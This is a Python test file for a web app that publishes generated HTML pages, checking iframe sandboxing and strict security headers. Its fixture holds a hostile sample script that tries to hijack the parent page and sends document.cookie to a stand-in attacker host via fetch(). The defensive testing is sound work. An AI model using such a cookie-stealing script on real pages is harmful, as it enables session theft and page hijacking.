"""Published pages must be sandboxed and CSP-protected; generated code must not
run on the main origin nor reach external resources."""
import pytest
from fastapi.testclient import TestClient

from app import main as M
from app import database as db


@pytest.fixture
def client():
    return TestClient(M.app)


AUTHORS = {
    "app_name": "x", "features": [],
}

EVIL = """<!DOCTYPE html><html><head><title>evil</title></head><body>
<h1>正常内容</h1>
<script>
try { parent.document.body.innerHTML = 'HIJACKED'; } catch (e) {}
fetch('https://evil.example.com/steal?d=' + document.cookie).catch(function(){});
</script></body></html>"""


def test_wrapper_uses_sandbox_without_same_origin(client):
    db.publish("sec0001", "p1", 1, EVIL, "安全测试")
    r = client.get("/p/sec0001")
    assert r.status_code == 200
    assert 'sandbox="allow-scripts allow-forms allow-modals"' in r.text
    assert "allow-same-origin" not in r.text
    # the wrapper itself must not inline the generated (untrusted) document
    assert "HIJACKED" not in r.text
    assert "用户生成内容" in r.text


def test_raw_has_strict_csp(client):
    db.publish("sec0002", "p1", 1, EVIL, "安全测试")
    r = client.get("/p/sec0002/raw")
    assert r.status_code == 200
    csp = r.headers.get("content-security-policy", "")
    assert "connect-src 'none'" in csp
    assert "frame-ancestors 'self'" in csp
    assert "base-uri 'none'" in csp
    assert r.headers.get("x-content-type-options") == "nosniff"
    assert r.headers.get("referrer-policy") == "no-referrer"


def test_unknown_slug_404(client):
    assert client.get("/p/nosuch").status_code == 404
